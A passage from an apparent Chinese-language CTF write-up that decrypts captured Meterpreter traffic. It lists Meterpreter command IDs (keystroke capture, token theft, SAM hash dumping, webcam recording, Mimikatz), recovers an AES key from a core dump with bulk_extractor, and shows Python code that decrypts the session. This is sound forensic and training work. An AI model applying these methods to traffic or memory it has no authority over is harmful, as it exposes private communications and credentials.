class="line">cmd_ids[<span class="number">1027</span>] = <span class="string">&quot;STDAPI_NET_TCP_CHANNEL_OPEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1028</span>] = <span class="string">&quot;STDAPI_RAILGUN_API&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1029</span>] = <span class="string">&quot;STDAPI_RAILGUN_API_MULTI&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1030</span>] = <span class="string">&quot;STDAPI_RAILGUN_MEMREAD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1031</span>] = <span class="string">&quot;STDAPI_RAILGUN_MEMWRITE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1032</span>] = <span class="string">&quot;STDAPI_REGISTRY_CHECK_KEY_EXISTS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1033</span>] = <span class="string">&quot;STDAPI_REGISTRY_CLOSE_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1034</span>] = <span class="string">&quot;STDAPI_REGISTRY_CREATE_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1035</span>] = <span class="string">&quot;STDAPI_REGISTRY_DELETE_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1036</span>] = <span class="string">&quot;STDAPI_REGISTRY_DELETE_VALUE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1037</span>] = <span class="string">&quot;STDAPI_REGISTRY_ENUM_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1038</span>] = <span class="string">&quot;STDAPI_REGISTRY_ENUM_KEY_DIRECT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1039</span>] = <span class="string">&quot;STDAPI_REGISTRY_ENUM_VALUE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1040</span>] = <span class="string">&quot;STDAPI_REGISTRY_ENUM_VALUE_DIRECT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1041</span>] = <span class="string">&quot;STDAPI_REGISTRY_LOAD_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1042</span>] = <span class="string">&quot;STDAPI_REGISTRY_OPEN_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1043</span>] = <span class="string">&quot;STDAPI_REGISTRY_OPEN_REMOTE_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1044</span>] = <span class="string">&quot;STDAPI_REGISTRY_QUERY_CLASS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1045</span>] = <span class="string">&quot;STDAPI_REGISTRY_QUERY_VALUE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1046</span>] = <span class="string">&quot;STDAPI_REGISTRY_QUERY_VALUE_DIRECT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1047</span>] = <span class="string">&quot;STDAPI_REGISTRY_SET_VALUE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1048</span>] = <span class="string">&quot;STDAPI_REGISTRY_SET_VALUE_DIRECT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1049</span>] = <span class="string">&quot;STDAPI_REGISTRY_UNLOAD_KEY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1050</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_DRIVER_LIST&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1051</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_DROP_TOKEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1052</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_GETENV&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1053</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_GETPRIVS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1054</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_GETSID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1055</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_GETUID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1056</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_LOCALTIME&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1057</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_REV2SELF&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1058</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_STEAL_TOKEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1059</span>] = <span class="string">&quot;STDAPI_SYS_CONFIG_SYSINFO&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1060</span>] = <span class="string">&quot;STDAPI_SYS_EVENTLOG_CLEAR&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1061</span>] = <span class="string">&quot;STDAPI_SYS_EVENTLOG_CLOSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1062</span>] = <span class="string">&quot;STDAPI_SYS_EVENTLOG_NUMRECORDS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1063</span>] = <span class="string">&quot;STDAPI_SYS_EVENTLOG_OLDEST&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1064</span>] = <span class="string">&quot;STDAPI_SYS_EVENTLOG_OPEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1065</span>] = <span class="string">&quot;STDAPI_SYS_EVENTLOG_READ&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1066</span>] = <span class="string">&quot;STDAPI_SYS_POWER_EXITWINDOWS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1067</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_ATTACH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1068</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_CLOSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1069</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_EXECUTE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1070</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_GET_INFO&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1071</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_GET_PROCESSES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1072</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_GETPID&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1073</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_IMAGE_GET_IMAGES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1074</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_IMAGE_GET_PROC_ADDRESS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1075</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_IMAGE_LOAD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1076</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_IMAGE_UNLOAD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1077</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_KILL&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1078</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_ALLOCATE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1079</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_FREE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1080</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_LOCK&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1081</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_PROTECT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1082</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_QUERY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1083</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_READ&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1084</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_UNLOCK&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1085</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_WRITE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1086</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_CLOSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1087</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_CREATE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1088</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_GET_THREADS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1089</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_OPEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1090</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_QUERY_REGS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1091</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_RESUME&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1092</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_SET_REGS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1093</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_SUSPEND&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1094</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_THREAD_TERMINATE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1095</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_WAIT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1096</span>] = <span class="string">&quot;STDAPI_UI_DESKTOP_ENUM&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1097</span>] = <span class="string">&quot;STDAPI_UI_DESKTOP_GET&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1098</span>] = <span class="string">&quot;STDAPI_UI_DESKTOP_SCREENSHOT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1099</span>] = <span class="string">&quot;STDAPI_UI_DESKTOP_SET&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1100</span>] = <span class="string">&quot;STDAPI_UI_ENABLE_KEYBOARD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1101</span>] = <span class="string">&quot;STDAPI_UI_ENABLE_MOUSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1102</span>] = <span class="string">&quot;STDAPI_UI_GET_IDLE_TIME&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1103</span>] = <span class="string">&quot;STDAPI_UI_GET_KEYS_UTF8&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1104</span>] = <span class="string">&quot;STDAPI_UI_SEND_KEYEVENT&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1105</span>] = <span class="string">&quot;STDAPI_UI_SEND_KEYS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1106</span>] = <span class="string">&quot;STDAPI_UI_SEND_MOUSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1107</span>] = <span class="string">&quot;STDAPI_UI_START_KEYSCAN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1108</span>] = <span class="string">&quot;STDAPI_UI_STOP_KEYSCAN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1109</span>] = <span class="string">&quot;STDAPI_UI_UNLOCK_DESKTOP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1110</span>] = <span class="string">&quot;STDAPI_WEBCAM_AUDIO_RECORD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1111</span>] = <span class="string">&quot;STDAPI_WEBCAM_GET_FRAME&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1112</span>] = <span class="string">&quot;STDAPI_WEBCAM_LIST&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1113</span>] = <span class="string">&quot;STDAPI_WEBCAM_START&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1114</span>] = <span class="string">&quot;STDAPI_WEBCAM_STOP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1115</span>] = <span class="string">&quot;STDAPI_AUDIO_MIC_START&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1116</span>] = <span class="string">&quot;STDAPI_AUDIO_MIC_STOP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1117</span>] = <span class="string">&quot;STDAPI_AUDIO_MIC_LIST&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1118</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_SET_TERM_SIZE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">1119</span>] = <span class="string">&quot;STDAPI_SYS_PROCESS_MEMORY_SEARCH&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2001</span>] = <span class="string">&quot;PRIV_ELEVATE_GETSYSTEM&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2002</span>] = <span class="string">&quot;PRIV_FS_BLANK_DIRECTORY_MACE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2003</span>] = <span class="string">&quot;PRIV_FS_BLANK_FILE_MACE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2004</span>] = <span class="string">&quot;PRIV_FS_GET_FILE_MACE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2005</span>] = <span class="string">&quot;PRIV_FS_SET_FILE_MACE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2006</span>] = <span class="string">&quot;PRIV_FS_SET_FILE_MACE_FROM_FILE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">2007</span>] = <span class="string">&quot;PRIV_PASSWD_GET_SAM_HASHES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3001</span>] = <span class="string">&quot;EXTAPI_ADSI_DOMAIN_QUERY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3002</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_GET_DATA&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3003</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_MONITOR_DUMP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3004</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_MONITOR_PAUSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3005</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_MONITOR_PURGE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3006</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_MONITOR_RESUME&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3007</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_MONITOR_START&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3008</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_MONITOR_STOP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3009</span>] = <span class="string">&quot;EXTAPI_CLIPBOARD_SET_DATA&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3010</span>] = <span class="string">&quot;EXTAPI_NTDS_PARSE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3011</span>] = <span class="string">&quot;EXTAPI_PAGEANT_SEND_QUERY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3012</span>] = <span class="string">&quot;EXTAPI_SERVICE_CONTROL&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3013</span>] = <span class="string">&quot;EXTAPI_SERVICE_ENUM&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3014</span>] = <span class="string">&quot;EXTAPI_SERVICE_QUERY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3015</span>] = <span class="string">&quot;EXTAPI_WINDOW_ENUM&quot;</span></span><br><span class="line">cmd_ids[<span class="number">3016</span>] = <span class="string">&quot;EXTAPI_WMI_QUERY&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4001</span>] = <span class="string">&quot;SNIFFER_CAPTURE_DUMP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4002</span>] = <span class="string">&quot;SNIFFER_CAPTURE_DUMP_READ&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4003</span>] = <span class="string">&quot;SNIFFER_CAPTURE_RELEASE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4004</span>] = <span class="string">&quot;SNIFFER_CAPTURE_START&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4005</span>] = <span class="string">&quot;SNIFFER_CAPTURE_STATS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4006</span>] = <span class="string">&quot;SNIFFER_CAPTURE_STOP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">4007</span>] = <span class="string">&quot;SNIFFER_INTERFACES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">7001</span>] = <span class="string">&quot;WINPMEM_DUMP_RAM&quot;</span></span><br><span class="line">cmd_ids[<span class="number">8001</span>] = <span class="string">&quot;KIWI_EXEC_CMD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">10001</span>] = <span class="string">&quot;UNHOOK_PE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">11001</span>] = <span class="string">&quot;ESPIA_IMAGE_GET_DEV_SCREEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12001</span>] = <span class="string">&quot;INCOGNITO_ADD_GROUP_USER&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12002</span>] = <span class="string">&quot;INCOGNITO_ADD_LOCALGROUP_USER&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12003</span>] = <span class="string">&quot;INCOGNITO_ADD_USER&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12004</span>] = <span class="string">&quot;INCOGNITO_IMPERSONATE_TOKEN&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12005</span>] = <span class="string">&quot;INCOGNITO_LIST_TOKENS&quot;</span></span><br><span class="line">cmd_ids[<span class="number">12006</span>] = <span class="string">&quot;INCOGNITO_SNARF_HASHES&quot;</span></span><br><span class="line">cmd_ids[<span class="number">13001</span>] = <span class="string">&quot;PYTHON_EXECUTE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">13002</span>] = <span class="string">&quot;PYTHON_RESET&quot;</span></span><br><span class="line">cmd_ids[<span class="number">14001</span>] = <span class="string">&quot;POWERSHELL_ASSEMBLY_LOAD&quot;</span></span><br><span class="line">cmd_ids[<span class="number">14002</span>] = <span class="string">&quot;POWERSHELL_EXECUTE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">14003</span>] = <span class="string">&quot;POWERSHELL_SESSION_REMOVE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">14004</span>] = <span class="string">&quot;POWERSHELL_SHELL&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15001</span>] = <span class="string">&quot;LANATTACKS_ADD_TFTP_FILE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15002</span>] = <span class="string">&quot;LANATTACKS_DHCP_LOG&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15003</span>] = <span class="string">&quot;LANATTACKS_RESET_DHCP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15004</span>] = <span class="string">&quot;LANATTACKS_RESET_TFTP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15005</span>] = <span class="string">&quot;LANATTACKS_SET_DHCP_OPTION&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15006</span>] = <span class="string">&quot;LANATTACKS_START_DHCP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15007</span>] = <span class="string">&quot;LANATTACKS_START_TFTP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15008</span>] = <span class="string">&quot;LANATTACKS_STOP_DHCP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">15009</span>] = <span class="string">&quot;LANATTACKS_STOP_TFTP&quot;</span></span><br><span class="line">cmd_ids[<span class="number">16001</span>] = <span class="string">&quot;PEINJECTOR_INJECT_SHELLCODE&quot;</span></span><br><span class="line">cmd_ids[<span class="number">17001</span>] = <span class="string">&quot;MIMIKATZ_CUSTOM_COMMAND&quot;</span></span><br></pre></td></tr></table></figure>

<p>现在可以导入它并将数值传递给tlv_types并取回字符串。这很简洁，因为它表明客户端做的第一件事是发送一个RSA公钥，然后服务器发送回一个加密的对称密钥:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b<span class="string">&#x27;\x00\x00\x00\x10&#x27;</span></span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;20785548998507895601&#x27;</span></span><br><span class="line">TLV l=302      t=TLV_TYPE_RSA_PUB_KEY       v=b<span class="string">&#x27;0\x82\x01&quot;0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=b<span class="string">&#x27;\x00\x00\x00\x10&#x27;</span></span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;20785548998507895601&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_RESULT            v=b<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line">TLV l=12       t=TLV_TYPE_SYM_KEY_TYPE      v=b<span class="string">&#x27;\x00\x00\x00\x01&#x27;</span></span><br><span class="line">TLV l=264      t=TLV_TYPE_ENC_SYM_KEY       v=b<span class="string">&#x27;-I\x1d\xc1\xa3YLu\xa9\x99/\x96&gt;\xe9\x1f\x9c\xf9g~\x0f&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="提取AES密钥"><a href="#提取AES密钥" class="headerlink" title="提取AES密钥"></a>提取AES密钥</h2><p>如果无法访问私有RSA密钥，就无法从PCAP中获得未加密的AES密钥。但是，当进程运行时，key将在内存中，这意味着它将在core.auto_update中.</p>
<p>AES256的密钥将是随机32字节。有很多方法可以找到这个key。一种方法是一次一个字节地遍历dump，尝试每个32字节的缓冲区。core dump没有那么大(2.7M)，所以这是可能的。但也有更好的方法。</p>
<p>另一种方法是运行gdb auto_update core.auto_update将core dump加载到GDB中。然后，可以使用一些逆向工程来确定key在内存中的位置，并通过GDB获取它。</p>
<p>最简单的方法是利用AES将密钥转换为所谓的”key schedule” 或 “round keys”。<span class="exturl" data-url="aHR0cHM6Ly9kaXlpbmZvc2VjLm1lZGl1bS5jb20vc2Nhbm5pbmctbWVtb3J5LWZvci1mZWstZTE3Y2EzZGIwOWM5">这篇文章<i class="fa fa-external-link-alt"></i></span>很好地解释了它(在”Approach 4”部分)。基本上，AES会把32个字节转换成15个16字节的round keys。这些看起来也是随机的。通常，程序只生成一次这些key，然后将它们存储在内存中，并在需要时使用它们，通常，就在内存中原始key的旁边，像这样:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response6.png"></li>
</ul>
<p>因为从密钥生成round keys的算法是公开的，所以可以扫描内存，对于每个可能的密钥，检查它是否会生成接下来的15*16 &#x3D; 240字节。如果有匹配，那肯定是AES密钥。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NpbXNvbmcvYnVsa19leHRyYWN0b3I=">bulk_extractor<i class="fa fa-external-link-alt"></i></span>是实现这种搜索的一个工具(以及许多其他工具)。下载最新的版本，运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/simsong/bulk_extractor</span><br><span class="line"><span class="built_in">cd</span> bulk_extractor</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">./configure; make; sudo make install</span><br></pre></td></tr></table></figure>

<p>它被安装在机器上。在coredump上运行它，给它一个输出到的文件夹:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bulk_extractor core.auto_update -o bulk_extractor/</span><br></pre></td></tr></table></figure>

<p>找到AES key:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/response]</span><br><span class="line">└─<span class="comment"># cat bulk_extractor/aes_keys.txt     </span></span><br><span class="line"><span class="comment"># BANNER FILE NOT PROVIDED (-b option)</span></span><br><span class="line"><span class="comment"># BULK_EXTRACTOR-Version: 2.0.1</span></span><br><span class="line"><span class="comment"># Feature-Recorder: aes_keys</span></span><br><span class="line"><span class="comment"># Filename: core.auto_update</span></span><br><span class="line"><span class="comment"># Feature-File-Version: 1.1</span></span><br><span class="line">1687472 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 <span class="built_in">dd</span> 3a c5 AES256</span><br><span class="line">2510080 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 <span class="built_in">dd</span> 3a c5 AES256</span><br><span class="line">2796144 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 <span class="built_in">dd</span> 3a c5 AES256</span><br><span class="line">2801600 f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 <span class="built_in">dd</span> 3a c5 AES256</span><br></pre></td></tr></table></figure>

<h2 id="解析加密的TLVs数据流"><a href="#解析加密的TLVs数据流" class="headerlink" title="解析加密的TLVs数据流"></a>解析加密的TLVs数据流</h2><p>把这个key添加到Python脚本的顶部:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aes_key = bytes.fromhex(<span class="string">&#x27;f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在，在解析TLV数据之前解密它:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)</span><br><span class="line"><span class="keyword">if</span> enc_flag == 1:</span><br><span class="line">    aes_iv = tlv_data[:16]</span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)</span><br><span class="line">    tlv_data = cipher.decrypt(tlv_data[16:])</span><br></pre></td></tr></table></figure>

<p>我发现了一些奇怪的边缘情况，在TLV数据的末尾有额外的数据(空值或AES填充?)为了解释这一点，将在顶部添加一些额外的检查:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> j &lt; len(tlv_data):</span><br><span class="line">    l = int.from_bytes(tlv_data[j:j+4], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> j + l &gt; len(tlv_data) or l == 0:</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Packet: <span class="built_in">type</span>=Req  len=363      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_NEGOTIATE_TLV_ENCRYPT</span><br><span class="line">TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b<span class="string">&#x27;20785548998507895601672178&#x27;</span></span><br><span class="line">TLV l=302      t=TLV_TYPE_RSA_PUB_KEY       v=b<span class="string">&#x27;0\x82\x01&quot;0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82&#x27;</span></span><br><span class="line">Packet: <span class="built_in">type</span>=Resp len=373      enc=None sess=00000000-0000-0000-0000-000000000000</span><br><span class="line">TLV l=24       t=TLV_TYPE_UUID              v=b<span class="string">&#x27;\xd2\x99\x93k\xe4W`\x99f `&quot;\x04\x0fx\xaa&#x27;</span></span><br><span class="line">TLV l=12       